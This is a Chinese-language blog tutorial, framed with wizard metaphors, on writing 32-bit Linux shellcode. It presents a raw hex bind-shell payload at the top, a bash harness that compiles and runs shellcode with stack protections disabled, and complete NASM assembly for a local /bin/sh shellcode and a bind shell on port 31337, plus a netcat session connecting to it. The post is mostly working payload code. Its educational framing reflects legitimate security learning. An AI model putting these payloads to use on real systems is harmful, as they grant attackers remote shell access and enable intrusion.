---
layout: post
title: "Shellcode: 暗黑魔咒"
excerpt: "Writing your first shellcode"
category: exploit
tags: [shellcode]
disqus: true
---


**警告：写的匆忙，里头有好多通甲字，作者实在懒得去辨认哪个字是对的，也许会满满修改吧，也许再也不会回头看了。另外，其实整个shellcode都来自那啥挖财宝的艺术一书，本文只是备忘、读后感、总结、笔记等诸如此类的东西，不算啥原创教程、葵花宝典、用户手册一类的高级货，所以很低端基础下档次，请大婶们轻喷:(**

> \x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x66\x58\x99\x31
> \xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43
> \x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd
> \x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52
> \x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9
> \xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52
> \x89\xe2\x53\x89\xe1\xcd\x80
> 
> 某个不知名的暗黑魔咒之shellcode

# 引子

多年之后，人们想起早年的尤利克斯黑法师仍然不寒而栗，他们来去无踪，却法力无边。他们出现在暗处低声吟诵不知所云的咒语，黑色的风暴便席卷整个大地，世界都在颤抖。他们不按规矩办事，是的，他们从不可能中创造出奇迹，几乎被奉为神明。

四十年前当炼金术士K&R在著名的贝尔实验室提炼出C元素时，黑魔法便诞生了。然而炼金术士们拒绝为他们符合K哲学的元素添加其它特性，他们想让使用它的法师们拥有更大的自由，嗯，法师们应该自己为自己负责。这种简洁和强大的元素立刻在法师们中流行开来，法师们用C元素重新创建了魔法世界，他们创造了各个大陆：尤利克斯、文都斯、利乐科斯等等，许多快乐的草泥马们无忧无虑地生活在这些繁荣的世界，他们又用C元素创建了因特奈特，将整个宇宙融为一体。是的，这是C的世界。

然而炼金术士们的选择终会付出代价，一些巫师们抓住C元素的不检查数据边界的特性，开发了强大的黑魔法。20世界初期大魔导师汤普森曾经说，在C的世界晴朗的天空中，漂浮着两朵乌云，一朵是黑魔法，一朵是黑魔法师们。是的，这些黑魔法和C的世界一样古老。

虽然那些黑魔法师们很可怕，正直而善良的法师们也没有坐以待毙，他们集结成社，开发了多种黑魔法防御术，建立了各种各样的法师团体替天行道保境安民，著名的有卡巴斯基、啊瓦斯特。但还有些团体在名目张胆研究和尝试新的黑魔法，他们负责测试和演习人们对黑魔法的防御程度，以促进对黑魔法防御术的研究。

多亏具有分享精神的正直法师们，黑魔法逐渐在公众面前揭开了它的迷雾和面纱。我们才知道那不过是一种不按规矩来的法术和一些平常很难用到的咒语而已，并不像魔法世界流行的黑法师泡沫剧中所描述的那样：黑法师们赤手空拳就能凭借意念摧毁整个C的世界。

本文作者很荣幸翻越了一些魔法禁书，看到了一些神奇的黑魔法，现在讲讲那让人眼花了乱该死的十六进制乱码咒语，希望大家喜欢。

## 你不能赤手空拳施法！

是的，起码你需要个魔杖或类似神秘的！电影电视上赤手空拳施法太奇葩了……大多数法器都是法师们由C元素炼成的，他们在C的世界里是真正的奇迹。这里我只列出一些在黑法师手中比较流行的法器：

- 蛇。是的，有群人很喜欢蛇……他们施法时会带上一群蛇，据说第一条C之蛇是由满头长蛇的Guido直接用C炼成的，没人见过他，因为见过它的法师都变成石头了。但是,他把炼蛇之术公知与众，于是他的蛇也因为强大到邪恶被越来越多的法师们作为了法器。
- 红宝石。 第一个C红宝石是十五年前炼成，最初的几年没什么人注意。后来其优良特性和美感吸引了越来越多的人，法师们发现红宝石使用起来灵活且让人快乐。特别是当法师团体买特斯普罗特将其作为其团体成员通用法器之后，红宝石迅速在黑法师团体中流行起来。
- 有群老法师骑着骆驼，至今人们不知道那些法师怎么靠骆驼施法
- 有群法师拿着破壳当法器。可能是贝壳或王八壳或者其它什么果壳之类的，壳不仅仅用来占卜，还可以杀人越货。如果你跟着往下尝试了，你就会用到一个壳= =
- 当然，有些法师只需要C元素就够了，
- 高端的法师甚至知道如何运用C炼成之前的物质，他们必须知道……
- 还有很多C炼成的工具，在不同大陆却可能不一样。
- 当然还有些很奇怪的人：有群法师骑着一匹快乐的草泥马，他们自称lisp alien，有群法师用咖啡杯做法器，听说还有群法师天天在那里撸啊撸的，这些中二的法师让本文作者无力吐槽：）

本文只讨论如何在利乐科斯大陆运用一种古老而优雅的咒语：这种咒语被称作shellcode，通过shellcode，黑法师们可以接管整个C的世界。

好吧，我不扯淡了，在你用python或perl或者其它啥可以被称作脚本语言的语言自动化一切之前，让我们仅仅用些基本的工具来编写shellcode。之后，你应该能综合运用各种法器来自动化你的黑魔法施法过程。

下文我将展示如何在一个现代的gentoo amd64系统上尝试这些古老的黑魔法。看看那些十六进制咒语都是些什么jb东西。非常奇葩的是，作者虽然用着64位系统却要带着你们写32位的咒语，这显然是作者二逼了。不过，其实差别不大，但总还是有的，至于在哪里，好像寄存器啊，socketcall啊(持续碎碎念中……)

## 准备你的法器

你需要：

- nasm - 80x86汇编器，用来获取机器码
- gcc - 编译器
- man-pages - 系统调用和函数参考
- od - 得到shellcode

最好有：

- prelink -设置堆栈可执行
- vim - 编写shellcode
- ld - 链接可执行文件
- gdb - 调试和观察、验证
- objdump - 用来显示目标文件中的信息
- strace - 追踪系统调用和信号

可以在gentoo linux中：

    emerge gcc gdb binutils coreutils nasm prelink vim man-pages strace 

当你碰到问题时，你最好的朋友是Linux Man Pages(利乐科斯大陆法师手册)

首先，建立并进入工作目录。

    ~/Work/notes ⮀ mkdir shellcode
    ~/Work/notes ⮀ cd shellcode

建立一个用来编译并测试最后移除测试程序的shell文件：`test.sh`

    ~/Work/notes/shellcode ⮀ cat >> test.sh << EOF
    #! /bin/env bash
    nasm "$1" # 用nasm 获取机器码
    
    cat >> test.c << EOF_FLAG # 生成测试shellcode的程序文件
    /* shellprogram.c */
    char code[] = 
    EOF_FLAG
    # 生成C数组形式的shellcode并写入测试程序文件 
    od -tx1 "`basename "$1" .asm`" | cut -c8-80 | sed -e 's/ /\\x/g' | sed -e 's/^/"/g' | sed -e 's/$/"/g' >> test.c
    
    echo "\"\";" >> test.c
    # 主程序 
    cat >> test.c << EOF_FLAG
    int main(int argc, char *argv[])
    {
      int (*exeshell)();
      exeshell = (int (*)()) code;
      (int)(*exeshell)();
    }
    EOF_FLAG
    # 编译程序并清理
    gcc -fno-stack-protector -z execstack -m32 -o tester test.c
    rm test.c
    ./tester
    rm tester
    EOF

这个程序会直接运行你的shellcode咒语。

## 编写Shellcode黑魔法咒语

在Linux系统中，法师们可以通过系统调用(syscall)直接和内核交互，这使得在Linux下编写shellcode非常直观方便。你可以在网上找到Linux系统调用的快速参考表格，这些系统调用经久不变。你可以这样快速查找调用号。当然可以把以下内容写成个简易脚本来减少击键次数。

    ~/Work/notes/shellcode ⮀ grep execve /usr/include/asm/unistd_32.h 
    #define __NR_execve 11

使用汇编来进行系统调用很直观，首先，32位cpu有8个通用寄存器(分别称为eax, ebx, ecx， edx, esi, edi, ebp, esp)，如何使用他们通常约定俗成。你需要把查找到的调用号推入eax中, 借着把该调用的参数依次推入ebx， ecx， edx， esi， edi，紧接着是一个`int 0x80`中断表示参数和调用哪个函数都指定了，现在可以开始调用了。

那么这些系统调用的参数如何查阅呢？俗话说男人最重要，谷哥是其次。这时候就man吧，比如查看`execve`用法

    ~/Work/notes/shellcode ⮀ man execve
    .... Lots of things.....
    SYNOPSIS
           #include <unistd.h>
    
           int execve(const char *filename, char *const argv[],
                      char *const envp[]);
    
在综述中(Synopsis)可以看到函数原型，那些参数就是要推入ebx， ecx， edx的东西。

但是怎么把`const char *filename`这些参数推入寄存器中呢？这时候就要利用栈了(stack)我们把参数推到栈上，然后把地址推入寄存器。

首先我们看看如何把调用号推入eax中

为了使shellcode中不包含`\x00`即C语言中的NULL(至于为什么，这些字符是字符串定届符，而shellcode很多是通过字符串注入，如果shellcode中包含这种字符，显然会被截断)，我们不能直接这样

    mov eax，0xb

这里我用的是metasploit项目tools中的`nasm_shell.rb`，可以很方便的用来查看汇编对应的机器码。

    nasm > mov eax, 0xb
    00000000  B80B000000        mov eax,0xb

显然有好多0,因为我们mov时mov的是整个32位0xb，我们可以先将eax通过xor运算变为0，再将0xb推入低十六位。

    nasm > xor eax, eax
    00000000  31C0              xor eax,eax
    nasm > mov al, 0xb
    00000000  B00B              mov al,0xb

还有能让shellcode更短的方法，这个方法利用了栈。向栈推入一子节的0xb，然后弹出到eax中。你总是希望shellcode更短，shellcode越短，能运用的范围就越大。

    nasm > push BYTE 11
    00000000  6A0B              push byte +0xb
    nasm > pop eax
    00000000  58                pop eax

接着让我们看看如何把参数依次推入ebx， ecx和edx。为了清晰起见再次将综述列到下面。

```c
#include <unistd.h>

int execve(const char *filename, char *const argv[],
           char *const envp[]);
```

我们要想在shellcode中运行一个shell(这就是为何称为shellcode，获取控制的顶尖方法)可以`int execve(address of "/bin//sh", address of ["/bin//sh", NULL], NULL)`

shellcode中的地址都应该是相对取地址，因为不知道shellcode会被注入到程序的哪些部分，任何硬编码都是不可取的。

我们利用栈完成一切相对取址。通过操作我们使栈顶看起来这样

    +++++
    "/bin"  <-- 地址1：四字节，32位字符串,同时这里是栈顶，即esp(在ia32架构中是这样)
    +++++
    "//sh"  <-- 地址2：32位字符串，//在unix系统中与/并无区别
    +++++
    NULL    <-- 地址：空字符NULL
    ......

这是这几步

```nasm
xor ecx, ecx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
```

你好奇那些`0x687322f2f`什么的怎么来的？

    ~/Work/notes/shellcode ⮀ echo -ne "/bin//sh" |od -tx4
    0000000 6e69622f 68732f2f
    

将esp即字符串`"/bin//sh"`的地址推入ebx，推入第一个参数。之后将一个NULL推入栈，栈变成这样

    +++++
    NULL    <-- 新栈顶，NULL
    +++++
    "/bin"  <-- 地址1：四字节，32位字符串地址
    +++++
    "//sh"  <-- 地址2：32位字符串，//在unix系统中与/并无区别
    +++++
    NULL    <-- 地址3：空字符NULL，界定字符串
    ......

这几步如下，将NULL的地址推入edx

```nasm
push ecx
xor edx, edx
mov edx, esp
```

把字符串的地址推入栈，则栈如下所示：

    +++++
    地址1   <-- 新栈顶esp，也是数组[address of "/bin//sh", NULL]的地址
    +++++
    NULL    <-- NULL
    +++++
    "/bin"  <-- 地址1：四字节，32位字符串地址
    +++++
    "//sh"  <-- 地址2：32位字符串，//在unix系统中与/并无区别
    +++++
    NULL    <-- 地址3：空字符NULL，界定字符串
    ......

这几步如下所示：

```nasm
push ebx
mov ecx, esp
```

接着，各个参数都已经推入相应寄存器，直接开始调用`int 0x80`

## 验证我们的咒语

把你的shellcode保存为任意以`.asm`为后缀的文件。比如`shellcode.asm`

用之前我们的测试脚本生成可执行文件：

    ~/Work/notes/shellcode ⮀ sh test.sh shellcode.asm
    sh-4.2$ 

非常棒！！

## 绑定端口的shellcode

如果你是通过某种法术把shellcode咒语施加到某个远程的程序上，一个在远程机器本地提供的shell没有丝毫用处。你需要绑定端口，然后使用TCP/IP瑞士军刀netcat来远程打开一个shell。

为了将一个shell绑定到某个端口(比如31337端口，注意1024以下FIXME端口号的绑定需要root权限)上，需要做以下几步，我们先写出等效的C程序：

```c
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)
{
  int sockfd, new_sockfd;
  struct sockaddr_in host_addr, client_addr;
  socklen_t sin_size;
  int yes=1;

  sockfd = socket(PF_INET, SOCK_STREAM, 0); // 建立一个流套接字
  host_addr.sin_family = AF_INET; // 定义协议族
  host_addr.sin_port = htons(31337); // 定义端口号，注意本地到网络字节序转换
  host_addr.sin_addr.s_addr = INADDR_ANY; // 用本地IP填满
  memset(&(host_addr.sin_zero), '\0', 8); // 剩余空位用0填充
  // 将流套接字绑定到本地31337端口
  bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));

  listen(sockfd, 4); // 监听
  sin_size = sizeof(struct sockaddr_in);
  new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
  dup2(new_sockfd, 0);
  dup2(new_sockfd, 1);
  dup2(new_sockfd, 2);
  char *newargv[] = { "/bin/sh", NULL };
  char *newenviron[] = { NULL };
  execve("/bin/sh", newargv, newenviron);
}
```

在linux中，可以直接和内核进行交互调用一个叫`socketcall`的syscall来使用这些函数

    ~/Work/notes/shellcode ⮀ grep socketcall /usr/include/asm/unistd_32.h 
    #define __NR_socketcall 102

函数的用法`man socketcall`。第一个参数在`/usr/include/linux/net.h`中寻找。

那么，在我们的shellcode中实现和C中一样，只是直接调用了系统调用socketcall。

首先建立一个套接字，用法请自行`man socket`。

    int socket(int domain, int type, int protocol);
    
协议族(domain)是2(`PF_INET`，或者`AF_INET`,一样的)，类型(type)为1(`SOCK_STREAM`)，协议(protocol)为0(这个协议族只有一个协议，0就可以了)。奇怪这些数字哪里来的？`cat /usr/include/bits/socket.h`中自行grep。

当我们用如下汇编语言来进行syscall之后，套接字句柄返回到eax中，我们用一个高效精简的指令把它放到esi中暂存。

```nasm
; s = socket(2, 1, 0) or socketcall(1, &(2,1,0))
  push BYTE 0x66 	; syscall 102
  pop eax 
  cdq 		; 将eax扩展为保存在eax:edx中的64位数，将edx清为0
  xor ebx, ebx 	; 将ebx清0
  inc ebx 		; 1 = socket()
  push edx		; 将NULL推入堆栈 参数列表 ( protocol = 0
  push BYTE 0x1	; 将8位1推入栈   (逆序)      SOCK_STREAM = 1
  push BYTE 0x2	; 将8位2推入栈               AF_INET = 2)
  mov ecx, esp 	; 将栈顶地址推入ecx
  int 0x80
```

接下来,将该套接字绑定(bind)到端口31337上,监听(listen)此端口,接收(accept)。方式和以上完全一样，不做详细解释。只在汇编程序中做一些必要的注释。遇到问题请man.

```nasm
; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66
  pop eax
  inc ebx
  push edx
  push WORD 0x697a; inverse order
  push WORD bx
  mov ecx, esp ; server struct pointer
  push BYTE 16
  push ecx
  push esi
  mov ecx, esp; argument array
  int 0x80

; listen(s, 0)  
  mov BYTE al, 0x66
  inc ebx
  inc ebx
  push ebx
  push esi
  mov ecx, esp
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66
  inc ebx
  push edx
  push edx
  push esi
  mov ecx, esp; ecx=argument array
  int 0x80
```

然后复制文件描述符到标准输入输出错误：

```nasm
; dup2(connected socket, {all three standard I/O file descriptors})
  xchg eax, ebx 	; put socket fd in ebx
  push BYTE 0x2
  pop ecx
dup_loop: 		; 使用循环来将文件描述符复制
  mov BYTE al, 0x3F	; 标准输入 0
  int 0x80		; 标准输出 1
  dec ecx		; 标准错误 2
  jns dup_loop
```

最后一步是我们上一步在本地完成的shellcode，启动shell：

```nasm
; execve(const char *filename, char *const argv[], char *const envp[])
  mov BYTE al, 11
  push edx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  push edx
  mov edx, esp
  push ebx
  mov ecx, esp
  int 0x80
```

## 验证新的咒语

启动我们的实验程序：

    ~/Work/notes/shellcode ⮀ sh test.sh bind_shell.asm

不要中断它，在另一个终端中用nc连接本地31337端口

     ~/Site ⮀ ⭠ master ● ⮀ nc localhost 31337
    whoami
    reverland
    id
    uid=1000(reverland) gid=1000(reverland) groups=1000(reverland),10(wheel),27(video),35(games),70(postgres),103(vboxusers),997(wireshark)
    
虽然没有提示符，但你仍然可以和它交互。

## What' more

这些咒语其实很复杂，这篇文章只是匆匆一瞥，希望读者能喜欢。要想了解更多请参阅文末的那些魔法禁书：）

如果有任何指教、建议、意见、痛斥、嘲笑、怀疑、讥讽、不解、感谢都欢迎*留言*或者通过*[电子邮件](http://reverland.org)*告知我，我必将毫不留情的……嗯，洗耳恭听。

Happy hacking！

## 魔法禁书目录

- 善良人手册：《The Shellcoder's Handbook》
- 黑魔法：挖财宝的艺术：《Hacking：The Art of Exploitation》
- 揭秘：我没看过这本书：《Shellcoder’s programming uncovered》

法师们注意，前两个因特奈特上都有中文版的！

